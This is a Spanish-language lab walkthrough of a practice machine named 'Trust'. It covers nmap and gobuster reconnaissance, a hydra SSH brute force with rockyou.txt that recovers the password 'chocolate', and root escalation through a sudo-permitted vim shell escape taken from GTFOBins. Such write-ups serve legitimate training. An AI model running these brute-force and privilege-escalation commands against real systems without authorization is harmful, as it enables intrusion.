# Trust
## 1. Reconocimiento de Puertos con Nmap

Utilizamos `nmap` para escanear los puertos de la máquina objetivo. Un escaneo inicial revela los puertos 22 (SSH) y 80 (HTTP) abiertos.

```bash
sudo nmap <IP_DEL_OBJETIVO>
```

Para obtener más detalles sobre los servicios, realizamos un escaneo de versiones:

```bash
sudo nmap -sV -p 22,80 <IP_DEL_OBJETIVO>
```

**Servicios Identificados:**

| PUERTO | SERVICIO | VERSIÓN |
|---|---|---|
| 22/tcp | ssh | OpenSSH |
| 80/tcp | http | Apache httpd |

La presencia de un servidor web Apache en el puerto 80 sugiere que la interacción inicial se realizará a través de una aplicación web.

## 2. Enumeración Web y Descubrimiento de Directorios

Al acceder a la dirección IP del objetivo en un navegador web, encontramos una página simple que no ofrece mucha interacción. Por lo que vamos a buscar directorios ocultos en el servidor web.

### 2.1. Búsqueda de Directorios con Gobuster

Empleamos `gobuster` para realizar un escaneo de directorios. 
```bash
sudo gobuster dir -u http://<IP_DEL_OBJETIVO>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

En este caso, se encontró el directorio `/server-status`, pero con un código de estado 403 (Prohibido), lo que indica que no tenemos permisos para acceder a él.

/server-status (Status: 403) [Size: 275]
Progress: 207643 / 207644 (100.00%)

### 2.2. Búsqueda de Archivos con Extensiones Específicas

Dado que el servidor es Apache, es común que las aplicaciones web utilicen archivos `.html` o `.php`. Realizamos un nuevo escaneo con `gobuster` especificando estas extensiones:

```bash
sudo gobuster dir -u http://<IP_DEL_OBJETIVO>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php
```
**Salida**

/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 622929 / 622932 (100.00%)

Este escaneo revela varios archivos, incluyendo `index.html` (la página que ya habíamos visto) y `secret.php`.

Al acceder a `secret.php`, encontramos un mensaje que dice: "Hola Mario, Esta web no se puede hackear.". Este mensaje es una pista importante, ya que nos proporciona un nombre de usuario: **Mario**.

## 3. Acceso Inicial: Fuerza Bruta SSH

Con el nombre de usuario "Mario" y el puerto SSH (22) abierto, el siguiente paso lógico es intentar un ataque de fuerza bruta para obtener la contraseña de SSH.

### 3.1. Ataque de Fuerza Bruta con Hydra

Utilizamos `hydra` con el nombre de usuario `mario` y un diccionario de contraseñas (`rockyou.txt`) para intentar iniciar sesión por SSH.

```bash
sudo hydra -l mario -P /usr/share/wordlists/rockyou.txt <IP_DEL_OBJETIVO> ssh
```

Si el ataque es exitoso, `hydra` nos revelará la contraseña. En este ejercicio, la contraseña encontrada es **chocolate**.

login: mario   password: chocolate

## 4. Escalada de Privilegios

Una vez que hemos obtenido acceso SSH como el usuario `mario`, el objetivo es escalar privilegios a `root`.

Comprobamos que no nos permite hacer`sudo su` con la contraseña `chocolate`

### 4.1. Verificación de Permisos Sudo

Primero, verificamos qué comandos puede ejecutar el usuario `mario` con `sudo` sin necesidad de contraseña. Esto se hace con el comando

```bash
sudo -l
# Salida:  /usr/bin/vim
```

La salida de este comando nos indica que el usuario `mario` puede ejecutar `/usr/bin/vim` sin contraseña.

### 4.2. Explotación de Vim (GTFOBins)

`vim` es un editor de texto, pero si se puede ejecutar con `sudo` sin contraseña, puede ser explotado para obtener un shell de `root`. Consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo), y nos proporciona el siguiente comando para obtener un shell de `root` a través de `vim`:

```bash
sudo /usr/bin/vim -c ':!/bin/sh'
```

*   `-c ':!/bin/sh'`: Abre `vim` y ejecuta el comando interno `:!/bin/sh`. Este comando le dice a `vim` que ejecute `/bin/sh` (un shell) . Dado que `vim` se está ejecutando con privilegios de `root`, el shell  también tendrá privilegios de `root`.

Después de ejecutar este comando, si la explotación es exitosa, el comando `whoami` confirmará que ahora somos `root`.
